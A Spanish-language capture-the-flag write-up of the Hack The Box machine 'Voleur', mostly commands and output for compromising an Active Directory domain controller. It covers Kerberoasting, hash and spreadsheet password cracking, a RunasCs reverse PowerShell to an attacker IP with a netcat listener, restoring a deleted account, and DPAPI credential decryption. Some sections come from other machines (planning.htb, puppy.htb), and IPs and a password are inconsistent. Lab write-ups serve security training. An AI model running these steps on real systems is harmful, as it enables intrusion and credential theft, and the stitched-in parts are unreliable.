
# Voleur

<figure><img src="/files/iiryTezMhjiBu07Vnxqj" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Voleur`
* **IP:** `10.10.11.76`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟡 Media`
* **Fecha:** `15-09-2025`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
ryan.naylor / HollowOct31Nyt
```

#### /etc/passwd

Añadimos la IP `10.10.11.70` a nuestro `/etc/hosts`

```bash
sudo echo "10.10.11.76 voleur.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.76
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 20:55:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting
* `2222` - Puerto SSH no standard (22)

Añadimos la IP `dc.voleur.htb` a nuestro `/etc/hosts`

```bash
sudo echo "10.10.11.76 dc.voleur.htb" | sudo tee -a /etc/hosts
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.76 -H "Host: defnotvalid.voleur.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:purple;">Enumeración inicial</mark>

```bash
enum4linux-ng -A -u 'ryan.naylor' -p 'HollowOct31Nyt' voleur.htb
```

***

## <mark style="color:purple;">Enumeración de Active Directory (si es AD)</mark>

### Extracción de información LDAP

```bash
ldapsearch -x -H ldap://voleur.htb -D "ryan.naylor@voleur.htb" -w 'HollowOct31Nyt' -b "dc=voleur,dc=htb" > ldapsearch.txt

cat ldapsearch.txt
```

### Enumeración de usuarios/grupos

FIltrando el ldapsearch obtenemos los usuarios del sistema:

```bash
cat ldapsearch.txt | grep user
                                     
objectClass: user
userAccountControl: 66048
userPrincipalName: ryan.naylor@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: marie.bryant@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: lacey.miller@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: svc_ldap@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: svc_backup@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: svc_iis@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: jeremy.combs@voleur.htb
objectClass: user
userAccountControl: 66048
userPrincipalName: svc_winrm@voleur.htb
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla, por lo que probaremos otras técnicas:

```bash
impacket-GetNPUsers voleur.htb/ -usersfile valid-users.txt -dc-ip 10.10.11.76

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User ryan.naylor@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marie.bryant@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lacey.miller@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ldap@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_iis@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeremy.combs@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_winrm@voleur.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
```

***

## <mark style="color:purple;">Enumeración con Bloodhound (Si es AD)</mark>

### Editar resolv.conf

<pre class="language-bash"><code class="lang-bash">sudo gedit /etc/resolv.conf
<strong>
</strong><strong>domain voleur.htb
</strong>nameserver 10.10.11.76
search voleur.htb
</code></pre>

### Bloodhound Python

No se puede utilizar la autenticación de contraseña directamente, por lo que generaremos un Ticket TGT para el usuario:

```bash
sudo ntpdate voleur.htb

2025-09-06 05:50:29.193483 (+0800) +28800.035516 +/- 0.018559 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28800.035516
```

```bash
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'             

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

```bash
export KRB5CCNAME=/home/kali/Escritorio/machines/htb/voleur/ryan.naylor.ccache 
```

Comprobamos que funciona con:

```bash
nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k

LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

Y recopilamos los datos de Bloodhound con:

```bash
bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 10S
INFO: Compressing output into 20250521152019_bloodhound.zip
```

### Análisis con Bloodhound

En Domain Users encontramos todos los usuarios del sistema (que vimos anteriormente)

<figure><img src="/files/PButk9WZ7wOh89hezFvl" alt=""><figcaption></figcaption></figure>

Descubrimos que el usuario `ryan.nailor` pertenece al grupo `FIRST-LINE TECHNICIANS`

<figure><img src="/files/Hi7xtX81wGtXy8zejgfg" alt=""><figcaption></figcaption></figure>

No tenemos ningún poder directo (Outbound Object Control) con este usuario, por lo que probaremos a seguir enumerando.

### Enumeración de Shares - Recursos compartidos

Para enumerar SMB en esta máquina debemos sincronizar la hora de nuestro Kali con el DC:

```
sudo ntpdate voleur.htb                                                                       

2025-09-06 06:13:36.970640 (+0800) +28800.037488 +/- 0.020068 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28800.037488
```

No podemos enumerar SMB con nuestro usuario:

```bash
nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

Tenemos permisos de lectura en el Share IT que nos llama la atención.

```bash
impacket-smbclient -k dc.voleur.htb                                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected

# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT

# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:40:17 2025 First-Line Support

# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 17:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 06:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

Nos descargamos el archivo interesante Access\_Review\.xlsx y vamos a echarle un ojo:&#x20;

```
libreoffice Access_Review.xlsx
```

Nos pide una contraseña, por lo que la crackearemos con John:

<figure><img src="/files/9gsXZVTxvw8eGjYprVGX" alt=""><figcaption></figcaption></figure>

```bash
office2john Access_Review.xlsx > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="/files/On7HPsvMDRmJ5BqGZjIq" alt=""><figcaption></figcaption></figure>

La contraseña es `football1`, vamos a ver que hay en el documento:

<figure><img src="/files/7AzB1E4G3S7lbhSSezEn" alt=""><figcaption></figcaption></figure>

Obtenemos lo siguiente:

#### **Credenciales Expuestas de Service Accounts**

* `SVC_Ldap`: `M1VyC9pW7qT5Vn`
* `SVC_Iis`: `N5pyGW1VqM7CZ8`

Siempre que encontramos credenciales de un sistema AD, debemos enumerar más en detalle esos usuarios.

### **Bloodhound**

Nos encontramos que `svc_ladp` tiene permisos `GenericWrite` sobre `lacey.miller`, y además tiene permisos `WriteSPN` sobre `svc_winrm`:

<figure><img src="/files/VfF9TvNRSnyXtmEFFXjk" alt=""><figcaption></figcaption></figure>

### Obtener ticket para svc\_ladp

```bash
impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```

```bash
export KRB5CCNAME="$PWD/svc_ldap.ccache"
```

### Kerberoasting dirigido

{% embed url="<https://github.com/ShutdownRepo/targetedKerberoast.git>" %}

```bash
python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$74d8872c106eac8c2083ac6e25ab64d1$b00956106f7c6322fd48b87816287b72139783b9c61e07c7353911de437a13b94ad9f61766b31a58720a6cd87abf41a30c0c8843dd02409875b31d6749b93b5040f85ab4f807b2535a34fa46f20ad3356d6bdc53be34d42372593689129f02fbfbb00ed2c57e533962b78b7731fe2a939bf4906852ac47be84ae898b007dcfcfa2f13d3c134cb988ceb1e086b76354fa3d8fd6c8a35fd30348d64b389db31c1ac76d621b0efee9b194697b1a3f870469c345b10d39c19532f4ab61327c7f3451ce856246a65e74e7a957a0d95c3742423427173449842fd1df199fbcf5dd221a5d3ef6385fd53cbce8a2904ff547d3087dac7f487cc2251ad369dbd10368e0326a519083fa14fd2a16091d86280469ee3628029fa0e6ca0e2a4843cb1071b629d9e03a584df0af56684f921ddbd4b88dbd0a7add47cb1beb561c00f8d9c3b9bc8c9cc88b30f793fea1493a3308a44eb300f3de424b0f96aaa0218438c5d981d8f8824638d3da45b4ac7193215aba18cbe3ae1d070448636fa1adcc9997a6097cd52dfd6fb559c8e813fff994d62e8576997eb89bc0575da1c82ece34c97367e735cf27f5c8abd20bd317153e76efefc71b4decc784409db9e5c0afcc3f62e6960c6a04997011b17e7916adb44cea7f54099af26ad8f95a377da34ca28f0036b2ef9ef3f82a5ca8c564c50e42f91f0be136feab2416eaefc913de089deb540128a665fb1bef77dcf5b01ee2abc9ee3c3f88aad850e057872281ffcf23239f0abcde137ea880bac66fcb5a30b58c38bf2c5a998949755d9f7e0329e6faa93e6b91305b31843aded82e825441b15858fda26ecf38600fc41a78c1f63dad244b782f142fec34f8a9515c4f8473fc2a76b4ff7b06115b0ea4d9706f13344d2383c58812433edbf138647127d6b40bc85451f92fc16b9a3a9ad4e29c175df038d318a9f45964c29df46a4879b83ab21d68f18bbf0048852930f8729eec07d5fd6785d684cffad33042bdd50a819a568ee383b0e01518804acafb2257e460cbc35ed34e70cddc2ec56c99821c291ce2c7ccd0c1d7e609c255bbe009be808296092c67c17d1b28f2d9e7e0dd25fb869a5738b5eeb0b64c67a93beee95271dfab39fa9219bae9afc916a76c9dfddfda6982e35c06c78ad4be84cc95f68bbf551081672762fa5fde8f8f78b1f220e9afd7cb6337b38ff9bb4cf8c9f732d1ad264bb714f1caba682fce6f3ade04c13025c07e377d0a73838038ec979a296474a406914698d0a5c2cbe786f67690f826d718d11429483487817537f32a32b5f05fa3cbd0e2bcb175e6d5d59e8c1965fc239710d170caa47a6ec183591b9b7567e8ef6f832050824a6aea291def6df32d3f09456f9c8fafb7238c569bc5e47fd664e65fe4039c6e20cbd1e0a835c8507adf51170528c122552445e8ddf13110238c820a64204e825f58832ca2c08bcd59d668ce0eff3584b726
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$224f2fc0521ed18995a128900dafab67$f484c541d31710856e076270c5f47d9ab3cb3e616a9d1bbe8de8e50b25a9d3a03c4c3461106c947a5c1be71a6d7c333c14f40612787520701afc7132b065cc26a9622cdffa67b70ec3fe4981a63279caa42893ca4652f315952bb9be4c5fe1095b0db4afbb9bc83ef23f603d00a88919819e1552f56245424d2861e1d915aa105043119ab6b6ceab10ea74d2c6be7dda70135f6b3de9178138513ccc07c8423168732200b27876640383a514adebf0bc0861c844259ac27654029d3bef01fbacb6bbc92ae32016ef3792f1a949aa8207d32f808e5fbd6f759ec1c37582d58ab84e19a5acdc7e5eaa8e090130c70a7bffe7fe1cb49444a6b9e8289e0859f5a10e5e9c0c9ea666e93f0af371d80e1e2f0a21de8d43ef9c14797fb0967141eb6596841a41a92bb21d50f47e0a5d4292956d33b86931e61314d6c0ad08a4c2d48cfc6ff0072aa2beaa517a7f7a90a904fe579b2325d0cbf4f5499a1c99720278c88bd87483c5ca3bdeee5a88278e91740ebd350a694c576b3c18f7b1ffc957d8f53ed3f0fd32f5f564d07fdbe486b76bee1225476cfa206c57aa6136d3caf87403e7837492be0e46c83419df60428712ae3ec38c78dc8bc764fecbe46c5fd6f2d9ae38072cc92ae07d41230e28558054df118d0638b8f4cacf3cb1c2063212a3ee7b7222b749dd4bb255af1c839119d2ca9cc275f0bea2245a1ec5e1c0a69d54e243f6bfdc1517efe8dd3cbe08c0b79a7be49a12121e60edc94554f336d91155d1e5308de6a365160978cbf50e784449ae17f92967fce7a391f6fe505052bad45f17abdff3427c8aea1e433229817e88f6284845da68171b612507603d3d3d98fe99d179c2ab179aca9473ff4f9eade7e1415c1239e8a4c70d4081e44e566be17c39065c332ac90139c47ded855bf14cbaaafc005278dd73a976fb14b3ffd05c5d04844e824fd64941219f6b4a0fefefd503aada4d4c9dcfa8d5cc873a87a118e34f5d0a067ae3acffafa21e5235bf07ada810fc5175d27fce3a6ccda13c14c14ed35961453041a502b29556abb2c2976cece6b1eeb979274447b53e2e1fc3b4cf130bb40acdf77137a604456d3a34b3efb52bd35270fe7878df19140a9fa97dfaaa5721001c37bc9e4baea51a5892b5762ef8a16daadca4b5abc8eb6f6e457ade4ea0e7270a515f64a6b6696cc225d3892f1fd63bf6b51ea2c220792094bb8c42520457973ee0eafded00be7012e69907b70a08c095a4db560d67ed17a5ade3a4bddb939a9773633745c545193e86c460a617c7a80b900f2df440f6fe870a10a0c7c3e30c971a58575a03cc1112d70882542e633ffe8170eedd7d53398982a63256465566b101d8acb3f969be94c96443ded29400b19462c361630b09edfb0b68629f3c30c4e7ddd7e777a851f7b4b0216157a33cfd391d33fed8365021e465ca13ce1493018d54cd5f2999e8756ab1ebddaff448
```

Bingo! Tenemos los hashes de `lacey.miller` y de `svc_winrm`. Al crackearlo con john conseguimos la contraseña en texto plano de la cuenta `svc_winrm`:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
```

***

## <mark style="color:purple;">User Flag</mark>

Vamos a generar un nuevo ticket para `svc_winrm` y nos conectamos por evil-winrm:

```bash
impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```

```bash
export KRB5CCNAME="$PWD/svc_winrm.ccache"
```

```bash
evil-winrm -i dc.voleur.htb -k "$KRB5CCNAME" -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
Warning: Useless cert/s provided, SSL is not enabled                              
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls

    Directory: C:\Users\svc_winrm\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---         9/14/2025   9:35 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
7384f07ce863f5c01bf89d081*******
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Restore Users

Nuestro usuario actual no tiene grandes permisos ni nada curioso en especial pero observamos que el usuario `svc_ldap` es miembro del grupo `restore_users`, que tiene permisos `GenericWrite` sobre Second Line Support Technicians, donde se encontraba el usuario Todd que encontramos anteriormente, pero que fue eliminado:

<figure><img src="/files/AA5oE4Cq9aqzQcJxuktK" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/GJSaptY6xUg3qylv9L8E" alt=""><figcaption></figcaption></figure>

### Restaurar al usuario Todd

Usaremos `RunasCs` para cambiar de usuario (porque `svc_ldap` no está en el grupo remoto y no puede iniciar sesión directamente)

{% embed url="<https://github.com/antonioCoco/RunasCs>" %}

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload /home/kali/Escritorio/machines/htb/voleur/RunasCs.exe
                                        
Info: Uploading /home/kali/Escritorio/machines/htb/voleur/RunasCs.exe to C:\Users\svc_winrm\Documents\RunasCs.exe                    
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Abrimos una segunda terminal con un listener de netcat y ejecutamos RunasCS como lvs\_ldap:

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.226:6666

[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-19448e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2216 created in background.
```

Y recibimos la shell cómo `svc_ldap`:

```bash
nc -nlvp 6666
                                       
listening on [any] 6666 ...
connect to [10.10.14.226] from (UNKNOWN) [10.10.11.76] 54610
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
voleur\svc_ldap
```

### Consultar usuarios eliminados de AD

```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

### Restaurar usuario Todd

```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects |
    Restore-ADObject
```

Lo podemos comprobar con:

```powershell
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.
```

### Bloodhound con credenciales

Volveremos a enumerar el sistema AD con Bloodhound pero usando esta vez un usuario con más privilegios cómo `svc_ldap`:

```bash
bloodhound-python -u svc_ldap -p M1XyC9pW7qT5Vn -k -ns 10.10.11.76 -c All -d voleur.htb --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 13 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20250915133254_bloodhound.zip
```

Observamos que el usuario Todd es miembro del grupo `Second Line Technicians`, al igual que `lacey.miller`:

<figure><img src="/files/NI3jBjON2hbISe6eofyZ" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/6HvVidHY0a2YyAXZAkRC" alt=""><figcaption></figcaption></figure>

### Generar TGT para Todd

Generamos el ticket de Todd y accedemos por SMB. Recordemos que sigue teniendo la misma contraseña que ya encontramos antes:

<figure><img src="/files/s4Vz81rI65jjIm6e3kJS" alt=""><figcaption></figcaption></figure>

```bash
impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
```

```bash
export KRB5CCNAME="$PWD/todd.wolfe.ccache"
```

#### Accedemos por SMB

```shell-session
impacket-smbclient -k dc.voleur.htb
                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 23:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 22:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 23:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 20:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 20:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 20:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 23:13:10 2025 Videos
```

Intentamos obtener datos y claves cifradas con dpapi en la ruta:

```
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft
```

```shell-session
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 21:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 20:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 20:53:08 2025 Preferred
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

```shell-session
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 21:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```

### Descifrando la clave DPAPI

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

### Descifrar credenciales de usuario

```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Obtenemos las credenciales del usuario `jeremy.combs`, por lo que volveremos a enumerar el entorno con Bloodhound y este usuario.

Observamos que es miembro de `Third Line Technicians`, por lo que igual conseguimos más información al acceder por SMB:

<figure><img src="/files/3JKXiZVel7ZGP5qpYgJR" alt=""><figcaption></figcaption></figure>

Repetimos el proceso, conseguimos un ticket para `jeremy.combs` y nos conectamos por SMB:

```bash
impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'   
                                                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
```

```bash
export KRB5CCNAME="$PWD/jeremy.combs.ccache"
```

